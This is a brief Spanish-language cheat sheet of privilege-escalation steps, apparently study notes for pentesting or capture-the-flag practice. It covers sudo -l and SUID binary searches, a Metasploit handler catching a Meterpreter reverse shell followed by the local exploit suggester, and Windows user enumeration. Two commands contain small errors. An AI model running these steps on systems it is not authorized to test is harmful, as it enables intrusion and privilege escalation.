## sudo -l

Listar binarios que se pueden ejecutar en modo sudo para el usuario actual, GTFOBins es útil para escalar privilegios con el uso de binarios. 

## Permisos SUID

Buscar binarios vulnerables del sistema con permisos root.

```bash
find / -perm 4000 2>/dev/null
```

Hay que buscar los que normalmente no tienen ese tipo de permisos, GTFOBins también tiene intrucciones para este tipo de casos.

## Automatización con Metasploit

```bash
msfconsole
msf6> use /milti/handler
set LHOST nuestraIP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

meterpreter > background

search local_exploit_suggester
sessions -l
set SESSION 1
run
```

Después intentamos con cada uno de los exploits sugeridos.

## Enumeración de usuarios en Windows

```powershell
net users
```

